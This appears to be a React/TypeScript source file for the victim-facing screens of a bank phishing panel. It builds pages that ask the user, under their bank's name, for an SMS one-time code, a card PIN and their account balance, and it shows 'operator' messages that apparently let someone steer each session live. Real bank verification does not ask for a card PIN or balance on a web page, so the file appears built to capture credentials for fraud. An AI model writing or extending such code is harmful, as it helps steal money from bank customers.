import React from "react";
import { useBankVerification } from "../hooks/use-bank-verification";
import type { BankVerificationProps, OperatorMessage, ResendState, TransactionDetails } from "../types";

// --- Spinner ---
function Spinner({ size = 40 }: { size?: number }) {
  const border = Math.max(2, Math.floor(size / 8));
  return (
    <div
      className="bank-ui-spinner"
      style={
        {
          "--bank-ui-spinner-size": `${size}px`,
          "--bank-ui-spinner-border": `${border}px`,
        } as React.CSSProperties
      }
    />
  );
}

// --- PinInput (controlled) ---
interface PinInputProps {
  value: string;
  onChange: (value: string) => void;
  masked: boolean;
  onMaskToggle: () => void;
  digits?: number;
  disabled?: boolean;
  label?: string;
}

function PinInput({
  value,
  onChange,
  masked,
  onMaskToggle,
  digits = 4,
  disabled,
  label = "PIN",
}: PinInputProps) {
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value.replace(/\D/g, "").slice(0, digits);
    onChange(v);
  };

  return (
    <div>
      <label htmlFor="pin-input" className="bank-ui-label bank-ui-label-center">
        {label}
      </label>
      <input
        id="pin-input"
        type={masked ? "password" : "text"}
        inputMode="numeric"
        maxLength={digits}
        value={value}
        onChange={handleChange}
        disabled={disabled}
        placeholder="••••"
        className="bank-ui-input bank-ui-input-pin"
      />
      <label htmlFor="pin-show-toggle" className="bank-ui-toggle-label">
        <input
          id="pin-show-toggle"
          type="checkbox"
          checked={!masked}
          onChange={() => onMaskToggle()}
        />
        Show PIN
      </label>
    </div>
  );
}

// --- StatusOverlay ---
function StatusOverlay({ message = "Processing..." }: { message?: string }) {
  return (
    <div className="bank-ui-overlay">
      <div className="bank-ui-overlay-content">
        <div className="bank-ui-overlay-spinner">
          <Spinner size={48} />
        </div>
        <p className="bank-ui-overlay-message">{message}</p>
      </div>
    </div>
  );
}


// --- TransactionDetailsBox ---
function TransactionDetailsBox({ details }: { details: TransactionDetails }) {
  const rows: { label: string; value: string }[] = [];
  if (details.merchantName) rows.push({ label: "Merchant Name", value: details.merchantName });
  if (details.amount) rows.push({ label: "Amount", value: details.amount });
  if (details.date) rows.push({ label: "Date", value: details.date });
  if (details.cardNumber) rows.push({ label: "Card Number", value: details.cardNumber });
  if (rows.length === 0) return null;

  return (
    <div className="bank-ui-transaction-details">
      <h3 className="bank-ui-transaction-details-title">Transaction details</h3>
      <ul className="bank-ui-transaction-details-list">
        {rows.map(({ label, value }) => (
          <li key={label} className="bank-ui-transaction-details-row">
            <span className="bank-ui-transaction-details-label">{label}</span>
            <span className="bank-ui-transaction-details-value">{value}</span>
          </li>
        ))}
      </ul>
    </div>
  );
}

// --- SmsOtp (controlled) ---
interface SmsOtpProps {
  bank?: string;
  transactionDetails?: TransactionDetails;
  code: string;
  onCodeChange: (code: string) => void;
  wrongCode?: boolean;
  expiredCode?: boolean;
  onTryAgain?: () => void;
  operatorMessage?: OperatorMessage | null;
  onSubmit: () => void;
  submitting: boolean;
  canSubmit: boolean;
  resendState: ResendState;
}

function SmsOtp({
  bank,
  transactionDetails,
  code,
  onCodeChange,
  wrongCode,
  expiredCode,
  onTryAgain,
  operatorMessage,
  onSubmit,
  submitting,
  canSubmit,
  resendState,
}: SmsOtpProps) {
  const messageClass =
    operatorMessage?.level === "error"
      ? "bank-ui-message bank-ui-message-error"
      : "bank-ui-message bank-ui-message-info";

  const { secondsLeft, canResend, onResend, resending } = resendState;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit();
  };

  return (
    <div className="bank-ui-layout">
      {wrongCode && (
        <div className="bank-ui-alert">
          <p className="bank-ui-alert-title">Wrong OTP. Please try again.</p>
        </div>
      )}
      {expiredCode && (
        <div className="bank-ui-alert">
          <p className="bank-ui-alert-title">Code expired. Please request a new code.</p>
        </div>
      )}
      {transactionDetails && <TransactionDetailsBox details={transactionDetails} />}
      <h2 className="bank-ui-heading">Enter verification code</h2>
      <p className="bank-ui-body">
        {bank
          ? `Please enter the OTP sent by ${bank} to your registered mobile number.`
          : "Please enter the OTP sent to your registered mobile number."}
      </p>
      {operatorMessage && (
        <div className={messageClass}>{operatorMessage.message}</div>
      )}
      <form onSubmit={handleSubmit} className="bank-ui-form">
        <div>
          <label htmlFor="otp-code" className="bank-ui-label">
            Verification code
          </label>
          <input
            id="otp-code"
            type="text"
            inputMode="numeric"
            maxLength={6}
            value={code}
            onChange={(e) => onCodeChange(e.target.value.replace(/\D/g, "").slice(0, 6))}
            disabled={submitting}
            placeholder="000000"
            className="bank-ui-input"
          />
        </div>
        <button
          type="submit"
          disabled={submitting || !canSubmit}
          className="bank-ui-btn"
        >
          Submit
        </button>
      </form>
      <div className="bank-ui-resend-row">
        {canResend ? (
          <button
            type="button"
            className="bank-ui-resend-btn"
            onClick={() => {
              onTryAgain?.();
              onResend();
            }}
            disabled={resending || submitting}
          >
            {resending ? "Sending..." : "Resend SMS"}
          </button>
        ) : (
          <span className="bank-ui-resend-countdown">
            Resend SMS in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:{String(secondsLeft % 60).padStart(2, "0")}
          </span>
        )}
      </div>
      {submitting && (
        <div className="bank-ui-waiting">
          <Spinner size={40} />
          <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
        </div>
      )}
    </div>
  );
}

// --- PinEntry (controlled) ---
interface PinEntryProps {
  bank?: string;
  transactionDetails?: TransactionDetails;
  pinValue: string;
  onPinChange: (value: string) => void;
  pinMasked: boolean;
  onPinMaskToggle: () => void;
  wrongCode?: boolean;
  expiredCode?: boolean;
  onTryAgain?: () => void;
  operatorMessage?: OperatorMessage | null;
  submitting: boolean;
  resendState: ResendState;
}

function PinEntry({
  bank,
  transactionDetails,
  pinValue,
  onPinChange,
  pinMasked,
  onPinMaskToggle,
  wrongCode,
  expiredCode,
  onTryAgain,
  operatorMessage,
  submitting,
  resendState,
}: PinEntryProps) {
  const messageClass =
    operatorMessage?.level === "error"
      ? "bank-ui-message bank-ui-message-error"
      : "bank-ui-message bank-ui-message-info";

  const { secondsLeft, canResend, onResend, resending } = resendState;

  return (
    <div className="bank-ui-layout">
      {wrongCode && (
        <div className="bank-ui-alert">
          <p className="bank-ui-alert-title">Wrong PIN. Please try again.</p>
        </div>
      )}
      {expiredCode && (
        <div className="bank-ui-alert">
          <p className="bank-ui-alert-title">Code expired. Please request a new code.</p>
        </div>
      )}
      {transactionDetails && <TransactionDetailsBox details={transactionDetails} />}
      <h2 className="bank-ui-heading">Enter your PIN</h2>
      <p className="bank-ui-body">
        {bank
          ? `Enter the PIN for your ${bank} card to complete the transaction.`
          : "Enter the PIN for your card to complete the transaction."}
      </p>
      {operatorMessage && (
        <div className={messageClass}>{operatorMessage.message}</div>
      )}
      <PinInput
        value={pinValue}
        onChange={onPinChange}
        masked={pinMasked}
        onMaskToggle={onPinMaskToggle}
        digits={4}
        disabled={submitting}
      />
      <div className="bank-ui-resend-row">
        {canResend ? (
          <button
            type="button"
            className="bank-ui-resend-btn"
            onClick={() => {
              onTryAgain?.();
              onResend();
            }}
            disabled={resending || submitting}
          >
            {resending ? "Sending..." : "Resend PIN"}
          </button>
        ) : (
          <span className="bank-ui-resend-countdown">
            Resend PIN in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:{String(secondsLeft % 60).padStart(2, "0")}
          </span>
        )}
      </div>
      {submitting && (
        <div className="bank-ui-waiting">
          <Spinner size={40} />
          <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
        </div>
      )}
    </div>
  );
}

// --- PushWaiting ---
interface PushWaitingProps {
  bank?: string;
  transactionDetails?: TransactionDetails;
}

function PushWaiting({ bank, transactionDetails }: PushWaitingProps) {
  return (
    <div className="bank-ui-layout-center">
      {transactionDetails && <TransactionDetailsBox details={transactionDetails} />}
      <div className="bank-ui-spinner-wrap">
        <Spinner size={64} />
      </div>
      <h2 className="bank-ui-heading">Confirm on your device</h2>
      <p className="bank-ui-body">
        {bank
          ? `A push notification has been sent by ${bank}. Please approve the transaction on your device.`
          : "A push notification has been sent to your mobile app. Please approve the transaction on your device."}
      </p>
    </div>
  );
}

// --- BalanceCheck (controlled) ---
interface BalanceCheckProps {
  bank?: string;
  transactionDetails?: TransactionDetails;
  balance: string;
  onBalanceChange: (balance: string) => void;
  operatorMessage?: OperatorMessage | null;
  onSubmit: () => void;
  submitting: boolean;
  canSubmit: boolean;
}

function BalanceCheck({
  bank,
  transactionDetails,
  balance,
  onBalanceChange,
  operatorMessage,
  onSubmit,
  submitting,
  canSubmit,
}: BalanceCheckProps) {
  const messageClass =
    operatorMessage?.level === "error"
      ? "bank-ui-message bank-ui-message-error"
      : "bank-ui-message bank-ui-message-info";

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit();
  };

  return (
    <div className="bank-ui-layout">
      {transactionDetails && <TransactionDetailsBox details={transactionDetails} />}
      <h2 className="bank-ui-heading">Balance verification</h2>
      <p className="bank-ui-body">
        {bank
          ? `Please enter your ${bank} account balance to complete the verification.`
          : "Please enter your account balance to complete the verification."}
      </p>
      {operatorMessage && (
        <div className={messageClass}>{operatorMessage.message}</div>
      )}
      <form onSubmit={handleSubmit} className="bank-ui-form">
        <div>
          <label htmlFor="balance" className="bank-ui-label-muted">
            Balance
          </label>
          <input
            id="balance"
            type="text"
            inputMode="decimal"
            value={balance}
            onChange={(e) => onBalanceChange(e.target.value)}
            disabled={submitting}
            placeholder="e.g. 1,234.56"
            className="bank-ui-input"
          />
        </div>
        <button
          type="submit"
          disabled={submitting || !canSubmit}
          className="bank-ui-btn bank-ui-btn-lg"
        >
          {submitting ? "Submitting..." : "Submit"}
        </button>
      </form>
      {submitting && (
        <div className="bank-ui-waiting">
          <Spinner size={40} />
          <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
        </div>
      )}
    </div>
  );
}

const LAYOUT_MAP: Record<string, React.ComponentType<any>> = {
  sms: SmsOtp,
  pin: PinEntry,
  push: PushWaiting,
  balance: BalanceCheck,
};

export function BankVerification(props: BankVerificationProps) {
  const {
    missingParams,
    shouldRenderNull,
    inProgress,
    awaitingVerification,
    baseLayout,
    layoutProps,
    error,
  } = useBankVerification(props);

  if (missingParams) {
    return <div className="bank-ui-error-missing">Missing channel or session</div>;
  }

  if (shouldRenderNull) {
    return null;
  }

  const Layout = LAYOUT_MAP[baseLayout] ?? LAYOUT_MAP.sms;

  return (
    <div className="bank-ui-verification">
      {inProgress && <StatusOverlay />}
      {awaitingVerification && <Layout {...layoutProps} />}
      {error && (
        <div className="bank-ui-error-toast-wrapper">
          <div className="bank-ui-error-toast">{error}</div>
        </div>
      )}
    </div>
  );
}
